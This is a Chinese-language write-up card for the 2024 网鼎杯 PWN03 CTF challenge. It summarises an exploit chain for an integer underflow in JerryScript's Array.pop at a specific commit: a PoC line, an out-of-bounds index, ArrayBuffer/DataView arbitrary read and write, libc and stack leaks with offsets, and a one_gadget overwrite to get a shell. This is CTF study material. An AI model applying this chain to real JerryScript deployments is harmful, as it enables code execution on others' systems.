---
title: "网鼎杯青龙组 PWN03 JerryScript Array Pop 整数下溢"
category: pwn
tags: ["网鼎杯", "pwn", "JerryScript", "ECMAScript", "Array-POP", "integer-underflow"]
signals: ["网鼎杯 2024", "JerryScript", "ECMAScript", "Array-POP", "integer-underflow", "ArrayBuffer", "DataView", "OOB-read", "OOB-write", "pwn_unknown", "Array", "pop", "length", "xffffffff"]
difficulty: hard
source: "https://www.ctfiot.com/215340.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 网鼎杯青龙组 PWN03 JerryScript Array Pop 整数下溢

> 赛事：网鼎杯 2024 | 方向：pwn | 难度：hard

## 一句话总结

JerryScript Array.pop() 整数下溢触发 length=0xffffffff，配合 ArrayBuffer 相对越界读写实现 aar/aaw，最终改 __libc_start_main_ret 跳 one_gadget。

## 攻击链

1. 编译 jerryscript commit d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba
2. 定位 ecma_builtin_array_prototype_object_pop 触发 length = 0xffffffff 整数下溢
3. 创建 ArrayBuffer + DataView 配合 pop 实现相对越界读写
4. 关键 PoC：let a=[1,1,1,1,1,1,1,1]; a.pop(); print(a.length)  // 4294967295=0xffffffff
5. 进一步 a[242] 读取 OOB 拿到相邻 ArrayBuffer 指针
6. 写 aar(addr, dv1, dv2): dv1.setBigUint64(0, addr) + dv2.getBigUint64(0) 任意地址读
7. 写 aaw(addr, value, dv1, dv2): setBigUint64 任意地址写
8. 通过 a[242] 泄 elf_base = buffer_p - 0x26db80
9. free_got = aar(elf_base + 0x26adf8) → libc_base = free_got - 0x97910
10. environ → stack 泄 __libc_start_main_ret
11. aaw(libc_start_main_ret, libc_base + 0x10a2fc) 写 one_gadget
12. 触发 aar(environ, d1, d2) 跳到 one_gadget 拿 shell

## 关键 payload

```
let a=[1,1,1,1,1,1,1,1]; a.pop(); a[242] 越界 + ArrayBuffer aar/aaw + one_gadget 0x10a2fc
```

## 经验教训

嵌入式 JS 引擎的 OOB 漏洞可通过 JS 高级抽象（Array/DataView）放大为完整读写原语，绕过 ASLR 改 GOT 拿 shell。

## 标签

JerryScript、ECMAScript、Array-POP、integer-underflow、ArrayBuffer、DataView、OOB-read、OOB-write、aar-aaw、GOT-overwrite、one_gadget

## 参考来源

- https://www.ctfiot.com/215340.html
- 原文件：网鼎杯青龙组的_PWN03_Jerryscript_题目.full.md
